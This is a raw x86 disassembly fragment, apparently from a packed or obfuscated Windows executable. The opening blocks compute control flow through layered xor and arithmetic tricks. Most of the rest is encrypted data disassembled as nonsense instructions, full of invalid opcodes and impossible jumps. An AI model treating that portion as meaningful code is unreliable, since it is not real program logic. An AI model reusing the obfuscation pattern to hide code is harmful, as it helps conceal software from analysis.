  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x66557a6a
  4125d0:	imul   DWORD PTR [eax+0x7b7b7318]
  4125d6:	mov    cl,0x9c
  4125d8:	jnp    0x412655
  4125da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125db:	aad    0x65
  4125dd:	mov    ecx,0x989e3738
  4125e2:	or     dl,al
  4125e4:	push   esp
  4125e5:	and    eax,0xc1105144
  4125ea:	mov    cl,0x38
  4125ec:	push   edi
  4125ed:	(bad)  
  4125ef:	(bad)  
  4125f0:	in     al,dx
  4125f1:	xchg   ebp,eax
  4125f2:	lods   al,BYTE PTR ds:[esi]
  4125f3:	jne    0x41260b
  4125f5:	in     al,0x11
  4125f7:	add    BYTE PTR [ebp+0x46e2f846],ch
  4125fd:	adc    dl,BYTE PTR [edx]
  4125ff:	fs (bad) 
  412601:	lods   al,BYTE PTR ds:[esi]
  412602:	cmp    dl,BYTE PTR [ebx]
  412604:	pop    eax
  412605:	push   ss
  412606:	test   DWORD PTR ds:0x81699c91,edi
  41260c:	sbb    eax,0x5f40114
  412611:	(bad)  
  412612:	sub    dh,0x9
  412615:	mov    ch,0x4b
  412617:	mov    edi,0xe48b7fcd
  41261c:	clc    
  41261d:	jae    0x41268b
  41261f:	jno    0x4125a1
  412621:	mov    eax,es:0x5f084d39
  412627:	sub    BYTE PTR [ecx+0x3a],bh
  41262a:	cld    
  41262b:	out    dx,eax
  41262c:	pop    ss
  41262d:	shl    DWORD PTR [esp+esi*8+0x669eb8bd],cl
  412634:	ds es jecxz 0x4126a4
  412638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412639:	jecxz  0x41268c
  41263b:	arpl   bp,bp
  41263d:	cmp    ebp,DWORD PTR [ecx+ebp*2]
  412640:	pop    ebx
  412641:	jnp    0x4125e8
  412643:	xor    ch,ah
  412645:	gs sbb eax,0xd19e1523
  41264b:	outs   dx,DWORD PTR ds:[esi]
  41264c:	je     0x4126b5
  41264e:	lods   al,BYTE PTR ds:[esi]
  41264f:	push   ebp
  412650:	mov    edi,0xd35b049a
  412655:	and    eax,0xdf008463
  41265a:	xchg   dl,dh
  41265c:	fwait
  41265d:	push   esi
  41265e:	mov    DWORD PTR ds:0x51e0ead7,edi
  412664:	icebp  
  412665:	mov    es,WORD PTR [edx-0x1a]
  412668:	xor    ebp,esp
  41266a:	jmp    0x41266d
  41266c:	xor    dl,cl
  41266e:	out    0x47,al
  412670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412671:	mov    ecx,ecx
  412673:	dec    DWORD PTR [edi]
  412675:	cmp    DWORD PTR [edx+eiz*2],0x3d4a136c
  41267c:	add    eax,0x1abca998
  412681:	js     0x412665
  412683:	repnz push cs
  412685:	das    
  412686:	cmp    DWORD PTR [edx-0x590cc668],0xe0ba0ddc
  412690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412691:	sbb    edx,DWORD PTR [ebx+0x1f]
  412694:	pop    esi
  412695:	add    ch,BYTE PTR [esi-0x6ede9c8f]
  41269b:	pop    ds
  41269c:	ficomp WORD PTR [ecx-0x69c7230]
  4126a2:	jg     0x412637
  4126a4:	cmp    DWORD PTR [edi-0x78927b96],edi
  4126aa:	pop    esp
  4126ab:	mov    esp,0x20f4d109
  4126b0:	inc    ebp
  4126b1:	imul   eax,DWORD PTR [esi],0xffffffc1
  4126b4:	mov    edi,0x61d21ec6
  4126b9:	gs das 
  4126bb:	dec    ebp
  4126bc:	xor    dh,BYTE PTR [edi]
  4126be:	mov    ah,0xf7
  4126c0:	jns    0x412683
  4126c2:	fwait
  4126c3:	out    0xec,eax
  4126c5:	aad    0x62
  4126c7:	push   ds
  4126c8:	xchg   esi,eax
  4126c9:	cld    
  4126ca:	jb     0x412724
  4126cc:	inc    edi
  4126cd:	xor    DWORD PTR fs:[ebx],0x4df1a64a
  4126d4:	dec    edx
  4126d5:	aad    0x7
  4126d7:	sbb    eax,0x5c649685
  4126dc:	mov    eax,0x16f02bbb
  4126e1:	ret    0x8d7f
  4126e4:	lods   al,BYTE PTR gs:[esi]
  4126e6:	push   ebp
  4126e7:	add    al,0x5e
  4126e9:	xchg   BYTE PTR [edi+0x32],ch
  4126ec:	ret    0x5e5e
  4126ef:	cli    
  4126f0:	mov    dl,BYTE PTR [esi+esi*1-0x1e1687f]
  4126f7:	daa    
  4126f8:	mov    eax,ds:0x6990d58e
  4126fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ff:	ret    0xe938
  412702:	into   
  412703:	or     bh,ah
  412705:	mov    bh,0xf0
  412707:	jno    0x41274a
  412709:	and    DWORD PTR [eax+eax*4-0x30],0x5d
  41270e:	scas   al,BYTE PTR es:[edi]
  41270f:	retf   0xda07
  412712:	cdq    
  412713:	and    dl,BYTE PTR [edx]
  412715:	mov    ebx,0xf70ae80
  41271a:	mov    DWORD PTR [ecx+edx*1],eax
  41271d:	in     eax,0x7f
  41271f:	imul   cx,WORD PTR [edx+0x7e],0xddd2
  412725:	lahf   
  412726:	aam    0x5a
  412728:	call   0xb06cc480
  41272d:	or     BYTE PTR [edx+0x7d],bh
  412730:	mov    edx,0xc5bbbc1e
  412735:	(bad)  
  412736:	adc    BYTE PTR [ecx-0x2201b78b],dh
  41273c:	test   DWORD PTR [edx],ebx
  41273e:	mov    eax,0xeea1eb35
  412743:	pop    es
  412744:	pusha  
  412745:	push   0x58
  412747:	inc    BYTE PTR [esi-0x2a]
  41274a:	add    eax,0x2fad2f57
  41274f:	outs   dx,BYTE PTR ds:[esi]
  412750:	cmp    DWORD PTR [ebp-0x11d5d7f2],ebp
  412756:	push   ebp
  412757:	stos   DWORD PTR es:[edi],eax
  412758:	cwde   
  412759:	mov    al,ds:0x3f17ae77
  41275e:	sbb    DWORD PTR [edi-0x43],edx
  412761:	aas    
  412762:	pop    eax
  412763:	dec    esp
  412764:	dec    edi
  412765:	jb     0x412710
  412767:	repnz std 
  412769:	dec    eax
  41276a:	mov    dl,0xaf
  41276c:	and    DWORD PTR [ebx-0x39a276ec],0x7a
  412773:	add    al,0x2a
  412775:	xlat   BYTE PTR ds:[ebx]
  412776:	pop    edx
  412777:	and    eax,0xa02991ec
  41277c:	adc    esi,esi
  41277e:	jnp    0x41278d
  412780:	cmp    eax,0x5630bb43
  412785:	jno    0x41273d
  412787:	push   ss
  412788:	mov    dh,0x32
  41278a:	stc    
  41278b:	adc    eax,0x48
  41278e:	cmp    dl,0x10
  412791:	jne    0x41274c
  412793:	repz sbb dh,dl
  412796:	lods   al,BYTE PTR ds:[esi]
  412797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412798:	fisttp WORD PTR [edi]
  41279a:	fmul   QWORD PTR [edx-0x285000bb]
  4127a0:	xlat   BYTE PTR ds:[ebx]
  4127a1:	pop    es
  4127a2:	cmp    BYTE PTR [ebp-0x76],0x4e
  4127a6:	out    0xf,eax
  4127a8:	push   ebx
  4127a9:	daa    
  4127aa:	inc    esp
  4127ab:	daa    
  4127ac:	xchg   edx,eax
  4127ad:	pop    esi
  4127ae:	les    ebp,FWORD PTR [edi]
  4127b0:	adc    esp,DWORD PTR [ebp+0x7547f3a1]
  4127b6:	cmp    eax,DWORD PTR [edi-0x6d]
  4127b9:	shl    esi,1
  4127bb:	lods   eax,DWORD PTR ds:[esi]
  4127bc:	pop    ebx
  4127bd:	inc    ebx
  4127be:	lods   al,BYTE PTR ds:[esi]
  4127bf:	rcr    DWORD PTR [ebx],0x32
  4127c2:	(bad)  
  4127c4:	and    DWORD PTR [esi+0x6c2592f4],ebp
  4127ca:	(bad)  
  4127cc:	push   ecx
  4127cd:	hlt    
  4127ce:	out    0x82,al
  4127d0:	ror    DWORD PTR [ecx-0x62aed31c],0xf4
  4127d7:	mov    ch,0xd6
  4127d9:	lahf   
  4127da:	std    
  4127db:	jno    0x412762
  4127dd:	shr    DWORD PTR [esi-0x6],0x1f
  4127e1:	jnp    0x4127ac
  4127e3:	popf   
  4127e4:	enter  0x399,0x5e
  4127e8:	mov    dl,0x45
  4127ea:	jae    0x41279d
  4127ec:	mov    dl,0x9c
  4127ee:	test   eax,0xec2235c4
  4127f3:	mov    ebp,0xb9af2c41
  4127f8:	mov    dl,0xe8
  4127fa:	xchg   esp,eax
  4127fb:	mov    ebp,0x92866047
  412800:	lea    edi,[esi]
  412802:	stc    
  412803:	fstp   st(7)
  412805:	imul   ebx,DWORD PTR [ecx],0x40
  412808:	push   0xf66d5404
  41280d:	and    eax,0x9598f9ae
  412812:	sub    esi,DWORD PTR [esi-0x4d93199e]
  412818:	mov    ah,BYTE PTR [edi-0x74bc7ccb]
  41281e:	shl    edi,cl
  412820:	das    
  412821:	push   edi
  412822:	jnp    0x41285b
  412824:	jae    0x4127d5
  412826:	fucomip st,st(5)
  412828:	sbb    bh,bl
  41282a:	ins    BYTE PTR es:[edi],dx
  41282b:	lods   al,BYTE PTR ds:[esi]
  41282c:	cld    
  41282d:	inc    ecx
  41282e:	and    al,0x34
  412830:	sub    DWORD PTR [ebx-0x22],eax
  412833:	iret   
  412834:	add    DWORD PTR [edi+eiz*2-0x76],esi
  412838:	xor    bh,BYTE PTR [esi-0x31]
  41283b:	xchg   ecx,eax
  41283c:	cmp    BYTE PTR es:[edi],bh
  41283f:	ss (bad) 
  412841:	pop    ebp
  412842:	xchg   ebp,eax
  412843:	xor    esi,DWORD PTR [ebp-0x36]
  412846:	xchg   al,dh
  412848:	pop    edx
  412849:	rcr    bl,1
  41284b:	je     0x412859
  41284d:	add    al,0xb1
  41284f:	xchg   edi,eax
  412850:	inc    ebp
  412851:	dec    esi
  412852:	mov    ss,ebx
  412854:	pop    esp
  412855:	out    0xe7,al
  412857:	mov    ds:0x8c0e3016,eax
  41285c:	sbb    al,0x82
  41285e:	ficomp WORD PTR [ebx]
  412860:	nop
  412861:	ret    
  412862:	imul   BYTE PTR [edi+0x5ece9ade]
  412868:	mov    esi,0x52ee264f
  41286d:	sbb    DWORD PTR [eax-0x14d56ccd],edi
  412873:	outs   dx,BYTE PTR ds:[esi]
  412874:	call   0x944e4b82
  412879:	mov    al,0x26
  41287b:	sbb    eax,0xd9614490
  412880:	mov    ch,0x68
  412882:	dec    edi
  412883:	mov    esp,0xc65c4f62
  412888:	cdq    
  412889:	enter  0xbe26,0xd7
  41288d:	cs fwait
  41288f:	popf   
  412890:	ror    BYTE PTR [eax],0x47
  412893:	add    al,0xea
  412895:	sbb    BYTE PTR [eax],dl
  412897:	mov    WORD PTR [esi-0x1a],gs
  41289a:	push   eax
  41289b:	fs jmp 0x4128d9
  41289e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41289f:	inc    esp
  4128a0:	(bad)  
  4128a1:	dec    eax
  4128a2:	lods   al,BYTE PTR cs:[esi]
  4128a4:	and    BYTE PTR [ecx+0x2a],dl
  4128a7:	adc    eax,0x5d909f62
  4128ac:	mov    edi,0x477940b0
  4128b1:	mov    ch,BYTE PTR [ebp+0x7e197300]
  4128b7:	jmp    0xc696e4b6
  4128bc:	retf   
  4128bd:	popa   
  4128be:	mov    ebp,0x5ac7106
  4128c3:	jmp    0x3ec2d40e
  4128c8:	push   ebx
  4128c9:	jnp    0x412894
  4128cb:	jg     0x41294b
  4128cd:	or     DWORD PTR [eax],edi
  4128cf:	loop   0x4128d3
  4128d1:	mov    eax,DWORD PTR [edx]
  4128d3:	mov    bh,0x26
  4128d5:	loopne 0x41288a
  4128d7:	loop   0x412946
  4128d9:	(bad)  
  4128da:	fisttp QWORD PTR [edx-0x4a]
  4128dd:	ss fcmovnb st,st(5)
  4128e0:	retf   
  4128e1:	push   edx
  4128e2:	sub    DWORD PTR [edx],eax
  4128e4:	mov    cl,0xe5
  4128e6:	jb     0x4128eb
  4128e8:	mov    ds:0x280136bf,al
  4128ed:	inc    ebp
  4128ee:	pushf  
  4128ef:	rcr    dh,cl
  4128f1:	cmp    ebp,esp
  4128f3:	bound  ebp,QWORD PTR [edi+ebp*4]
  4128f6:	jmp    0x81ae9869
  4128fb:	ds inc edi
  4128fd:	mov    ss,esp
  4128ff:	cmp    BYTE PTR [eax],dh
  412901:	out    dx,al
  412902:	(bad)  
  412903:	push   ss
  412904:	(bad)  
  412905:	fisubr WORD PTR [ecx+0x55]
  412908:	hlt    
  412909:	loopne 0x41293f
  41290b:	adc    bh,BYTE PTR [edi]
  41290d:	lods   eax,DWORD PTR ds:[esi]
  41290e:	mov    al,ds:0x6309ebde
  412913:	jmp    0x7add:0x686f8ca6
  41291a:	sbb    DWORD PTR ds:0xe1bd7b7d,ecx
  412920:	ss push cs
  412922:	jo     0x4128b4
  412924:	xchg   esp,eax
  412925:	int3   
  412926:	inc    edi
  412927:	cmp    cl,ch
  412929:	int3   
  41292a:	pushf  
  41292b:	int    0x7d
  41292d:	xchg   edx,eax
  41292e:	xchg   esi,eax
  41292f:	jle    0x4128be
  412931:	inc    esi
  412932:	pop    ds
  412933:	je     0x4128db
  412935:	adc    bh,0x49
  412938:	imul   ebx,DWORD PTR [ebx+ebp*4+0x29],0xcefbd0b2
  412940:	addr16 pusha 
  412942:	aam    0x76
  412944:	mov    esi,0x8acb155c
  412949:	xchg   ebp,eax
  41294a:	dec    ecx
  41294b:	push   0xffffff92
  41294d:	inc    BYTE PTR [edx+0x1f]
  412950:	pop    ss
  412951:	or     edi,DWORD PTR [edx]
  412953:	in     eax,0xc1
  412955:	inc    esp
  412956:	popf   
  412957:	and    edi,DWORD PTR [esi+0xb]
  41295a:	test   al,0xa2
  41295c:	sti    
  41295d:	push   ecx
  41295e:	push   edx
  41295f:	mov    ch,0xa8
  412961:	js     0x4129ad
  412963:	push   esi
  412964:	iret   
  412965:	push   edi
  412966:	nop
  412967:	gs popf 
  412969:	add    ebx,DWORD PTR [edi]
  41296b:	ret    0x6cbe
  41296e:	idiv   BYTE PTR [esp+eax*8-0x34]
  412972:	repnz (bad) 
  412974:	fdiv   QWORD PTR [ecx]
  412976:	test   eax,0xcb59372
  41297b:	cmp    al,BYTE PTR [edi*1-0x606a6b40]
  412982:	mov    ch,0x43
  412984:	xchg   BYTE PTR [eax-0xce0ffe8],bh
  41298a:	inc    ecx
  41298b:	shr    BYTE PTR [ecx+0x395bb580],cl
  412991:	aas    
  412992:	and    DWORD PTR [ecx-0x7c],eax
  412995:	mov    dl,0x48
  412997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412998:	scas   eax,DWORD PTR es:[edi]
  412999:	pop    ds
  41299a:	lods   eax,DWORD PTR ds:[esi]
  41299b:	pop    eax
  41299c:	icebp  
  41299d:	loope  0x412a16
  41299f:	jmp    0x7b96f95a
  4129a4:	fs push es
  4129a6:	push   0xffffffaf
  4129a8:	call   0xb16f95bf
  4129ad:	dec    esi
  4129ae:	sbb    dh,0x73
  4129b1:	hlt    
  4129b2:	mov    ebp,0x2531b709
  4129b7:	test   al,0xd1
  4129b9:	xor    eax,0xa1cb565e
  4129be:	cld    
  4129bf:	retf   0x3f4c
  4129c2:	inc    esp
  4129c3:	mov    dh,0x6
  4129c5:	mov    esp,0xf100080e
  4129ca:	scas   eax,DWORD PTR es:[edi]
  4129cb:	sbb    cl,al
  4129cd:	loopne 0x41296f
  4129cf:	retf   
  4129d0:	mov    al,ds:0xbb817cd1
  4129d5:	dec    ecx
  4129d6:	inc    esi
  4129d7:	mov    dl,0xf
  4129d9:	jg     0x412970
  4129db:	sub    dh,cl
  4129dd:	adc    BYTE PTR [eax-0x5e],dl
  4129e0:	(bad)  
  4129e2:	or     eax,0x165cb023
  4129e7:	sar    DWORD PTR [edx+0x47],0x8d
  4129eb:	pop    ss
  4129ec:	and    DWORD PTR ds:0x799ce2eb,esp
  4129f2:	mov    ch,0xf8
  4129f4:	jbe    0x4129c1
  4129f6:	(bad)  
  4129f7:	and    DWORD PTR [ecx-0x63702294],esp
  4129fd:	pop    ds
  4129fe:	sub    DWORD PTR [eax],0xffffff89
  412a01:	fmul   QWORD PTR [ecx+eax*4+0x30]
  412a05:	mul    DWORD PTR [edi-0x7b]
  412a08:	xchg   edi,eax
  412a09:	outs   dx,DWORD PTR ds:[esi]
  412a0a:	cmp    esi,0xffffffd9
  412a0d:	rol    BYTE PTR [edx],cl
  412a0f:	jmp    0x7453:0x871ee621
  412a16:	xor    al,0xb9
  412a18:	adc    cl,BYTE PTR [edi+0x7f732f46]
  412a1e:	inc    edx
  412a1f:	es jb  0x412a98
  412a22:	push   ebp
  412a23:	(bad)  
  412a24:	sub    BYTE PTR [ebx+eax*2-0x6e708ae5],bl
  412a2b:	push   esi
  412a2c:	sbb    ebx,ebx
  412a2e:	jmp    0x9613168f
  412a33:	jbe    0x412a12
  412a35:	inc    esp
  412a36:	xchg   edx,eax
  412a37:	or     ebp,ebx
  412a39:	jne    0x412a2c
  412a3b:	gs cmp al,0xbb
  412a3e:	mov    edi,0xa5548b2a
  412a43:	out    dx,al
  412a44:	cdq    
  412a45:	lahf   
  412a46:	jo     0x412a0a
  412a48:	mov    eax,ds:0x3922f1d7
  412a4d:	js     0x412a0a
  412a4f:	pop    ecx
  412a50:	lock jmp 0x65fe7f66
  412a56:	mov    BYTE PTR [ebp-0x298169fd],ah
  412a5c:	(bad)  
  412a5d:	jmp    0x6f06:0x72286115
  412a64:	mov    cl,0x1c
  412a66:	retf   
  412a67:	fs pop ebp
  412a69:	lods   eax,DWORD PTR ds:[esi]
  412a6a:	into   
  412a6b:	xchg   ebp,eax
  412a6c:	xchg   ecx,eax
  412a6d:	or     BYTE PTR [edx+0x73],0x50
  412a71:	call   0xa4e8c7d4
  412a76:	push   cs
  412a77:	mov    BYTE PTR [edx-0x6bf15e84],dh
  412a7d:	jae    0x412ae7
  412a7f:	inc    ebp
  412a80:	js     0x412a0c
  412a82:	push   esi
  412a83:	(bad)  
  412a85:	and    BYTE PTR [ebp+eiz*4-0x1cdcc25e],ah
  412a8c:	ror    bl,cl
  412a8e:	je     0x412a83
  412a90:	pop    es
  412a91:	adc    BYTE PTR [ecx+eax*4],al
  412a94:	jecxz  0x412a9f
  412a96:	pushf  
  412a97:	std    
  412a98:	iret   
  412a99:	xchg   esp,eax
  412a9a:	mov    ds:0x6b79f677,eax
  412a9f:	jne    0x412afc
  412aa1:	dec    edi
  412aa2:	arpl   WORD PTR [eax],si
  412aa4:	(bad)
  412aa8:	mov    BYTE PTR [edx-0x26],0x2b
  412aac:	sub    DWORD PTR [eax],ebp
  412aae:	call   0xacff:0x21c17abf
  412ab5:	dec    esp
  412ab6:	add    dh,BYTE PTR [ecx]
  412ab8:	mul    DWORD PTR ds:0x17829aa2
  412abe:	(bad)
  412ac1:	stos   DWORD PTR es:[edi],eax
  412ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ac3:	xor    BYTE PTR [eax+0x14d930ed],bl
  412ac9:	hlt    
  412aca:	mov    eax,ds:0x73fafcae
  412acf:	(bad)  
  412ad0:	js     0x412b4b
  412ad2:	mov    dl,BYTE PTR [ebx+0xa]
  412ad5:	aad    0x30
  412ad7:	pop    ebx
  412ad8:	cmp    bl,BYTE PTR ds:0xde291298
  412ade:	cmp    eax,0xd904ca6d
  412ae3:	fdiv   QWORD PTR [ecx+0x7acd69e0]
  412ae9:	add    eax,0xd69a6dca
  412aee:	into   
  412aef:	mov    dh,0xa3
  412af1:	inc    ebp
  412af2:	mov    ds,esp
  412af4:	add    BYTE PTR [edx-0x3c3546e1],dl
  412afa:	lahf   
  412afb:	retf   0x8e0e
  412afe:	arpl   cx,di
  412b00:	mov    ecx,0xc6699b48
  412b05:	shr    DWORD PTR ss:[eax-0x60],1
  412b09:	add    ebx,edx
  412b0b:	shl    BYTE PTR [edx-0x332fdfc5],0xee
  412b12:	add    DWORD PTR [edi+0x3890f6f7],edx
  412b18:	hlt    
  412b19:	mov    al,0x8e
  412b1b:	xchg   esi,eax
  412b1c:	sbb    BYTE PTR [edi],ah
  412b1e:	cmp    al,0x69
  412b20:	std    
  412b21:	int3   
  412b22:	and    ch,cl
  412b24:	lahf   
  412b25:	mov    cl,0x41
  412b27:	fwait
  412b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b29:	pop    ebx
  412b2a:	jne    0x412ad9
  412b2c:	dec    DWORD PTR [ecx+ecx*2]
  412b2f:	(bad)  
  412b30:	pop    ds
  412b31:	cdq    
  412b32:	xchg   al,bl
  412b34:	mov    bl,0xea
  412b36:	and    BYTE PTR [edi],0xed
  412b39:	call   0xfe35:0x3da472bb
  412b40:	outs   dx,DWORD PTR ds:[esi]
  412b41:	sub    edi,ebp
  412b43:	push   es
  412b44:	sbb    esp,DWORD PTR [ecx-0x5b9038d]
  412b4a:	inc    ebx
  412b4b:	sub    eax,0x16c50773
  412b50:	test   eax,0xc178a06
  412b55:	clc    
  412b56:	push   es
  412b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b58:	fldenv [ebx+0x1900e6f8]
  412b5e:	aaa    
  412b5f:	and    eax,0xb6d9a69f
  412b64:	rcr    DWORD PTR [edi],cl
  412b66:	(bad)  
  412b67:	xchg   ecx,eax
  412b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b69:	sub    edx,ebp
  412b6b:	jo     0x412b95
  412b6d:	push   ebx
  412b6e:	rcl    BYTE PTR [ecx+0x64],cl
  412b71:	ds sub ebx,edi
  412b74:	(bad)  
  412b76:	mov    DWORD PTR [eax-0x24c40f89],0x58740fd0
  412b80:	scas   al,BYTE PTR es:[edi]
  412b81:	out    0x2a,eax
  412b83:	sti    
  412b84:	bound  ebx,QWORD PTR [eax-0x56]
  412b87:	aad    0xf
  412b89:	lds    ebp,FWORD PTR [eax]
  412b8b:	call   0xeddc:0x72a4be26
  412b92:	aad    0xeb
  412b94:	mov    ebx,0x16c1926d
  412b99:	aad    0x9f
  412b9b:	pop    ss
  412b9c:	jnp    0x8ba36dc
  412ba2:	and    edx,edi
  412ba4:	or     cl,al
  412ba6:	sbb    edi,esi
  412ba8:	push   eax
  412ba9:	sahf   
  412baa:	mov    dl,BYTE PTR [edi-0x5e]
  412bad:	xor    dh,BYTE PTR [ebx+0x6a6299b8]
  412bb3:	push   edx
  412bb4:	mov    WORD PTR [ecx],cs
  412bb6:	stc    
  412bb7:	pushf  
  412bb8:	mov    eax,0x1b05c45e
  412bbd:	mov    WORD PTR [edi],cs
  412bbf:	inc    edi
  412bc0:	and    BYTE PTR [edx],dl
  412bc2:	sbb    ebp,eax
  412bc4:	inc    ebp
  412bc5:	xor    DWORD PTR [ebx],0xa3df7f45
  412bcb:	aaa    
  412bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bcd:	retf   
  412bce:	push   0x36
  412bd0:	xor    cl,BYTE PTR [ebx+0x4e66769b]
  412bd6:	and    al,0xf6
  412bd8:	xor    al,0x87
  412bda:	jg     0x412c3e
  412bdc:	fmulp  st(1),st
  412bde:	icebp  
  412bdf:	and    DWORD PTR [ebx-0x147494ce],0xffffffa5
  412be6:	xor    al,0xc0
  412be8:	or     eax,0x79c9db4b
  412bed:	xor    BYTE PTR [edx],0x9a
  412bf0:	into   
  412bf1:	retf   0x1bb
  412bf4:	sub    al,0xbd
  412bf6:	pause  
  412bf8:	imul   eax,DWORD PTR [esi],0x33
  412bfb:	imul   eax,DWORD PTR [edi+ebp*8+0x4b8ace80],0xff90c6d2
  412c06:	adc    dl,BYTE PTR [ebx]
  412c08:	jmp    0x6016:0x15f34eaf
  412c0f:	repz cwde 
  412c11:	ds test eax,0xa288c306
  412c17:	shl    BYTE PTR [esi+0x5951eb18],cl
  412c1d:	imul   ecx,DWORD PTR [esi],0xffffffb4
  412c20:	je     0x412c3b
  412c22:	mov    edx,0x16b7ae7e
  412c27:	dec    ebp
  412c28:	shl    DWORD PTR [esi],1
  412c2a:	inc    esi
  412c2b:	lahf   
  412c2c:	cwde   
  412c2d:	adc    cl,al
  412c2f:	and    al,0xba
  412c31:	and    dl,BYTE PTR [ebx+ebp*8]
  412c34:	rol    BYTE PTR [esi+0x37],cl
  412c37:	sub    eax,0x6b3e32a2
  412c3c:	fnstcw WORD PTR [ecx+0x63]
  412c3f:	pusha  
  412c40:	xchg   ecx,eax
  412c41:	dec    ebp
  412c42:	mov    es,WORD PTR [edx]
  412c44:	jecxz  0x412c90
  412c46:	stos   DWORD PTR es:[edi],eax
  412c47:	mov    WORD PTR [edi-0x72f19624],fs
  412c4d:	neg    BYTE PTR [eax]
  412c4f:	ror    ah,1
  412c51:	adc    ebx,0xcf140418
  412c57:	hlt    
  412c58:	inc    ecx
  412c59:	(bad)  
  412c5a:	retf   
  412c5b:	dec    ecx
  412c5c:	shr    DWORD PTR [edi+0x6efe561a],0x74
  412c63:	jmp    0x2b7:0x500e270e
  412c6a:	cmp    cl,BYTE PTR [eax+0x52ebc41a]
  412c70:	jecxz  0x412c74
  412c72:	es pop ecx
  412c74:	daa    
  412c75:	leave  
  412c76:	cmc    
  412c77:	cs pop ebp
  412c79:	out    dx,al
  412c7a:	ret    
  412c7b:	xor    eax,0xa6504d14
  412c80:	push   ecx
  412c81:	js     0x412cf7
  412c83:	sub    eax,0x531bbb43
  412c88:	jns    0x412ce9
  412c8a:	pop    edx
  412c8b:	in     al,dx
  412c8c:	retf   0xb116
  412c8f:	iret   
  412c90:	jmp    0xfdd1:0x113f43da
  412c97:	pusha  
  412c98:	push   esi
  412c99:	or     BYTE PTR cs:[esp+eiz*2],dl
  412c9d:	fcmovbe st,st(2)
  412c9f:	xchg   ecx,eax
  412ca0:	jmp    0x6f4f:0xeb1854b6
  412ca7:	cdq    
  412ca8:	xor    al,0xcb
  412caa:	or     al,0xb6
  412cac:	xor    al,0x34
  412cae:	clc    
  412caf:	cdq    
  412cb0:	aas    
  412cb1:	test   al,0xb3
  412cb3:	inc    edi
  412cb4:	pop    edi
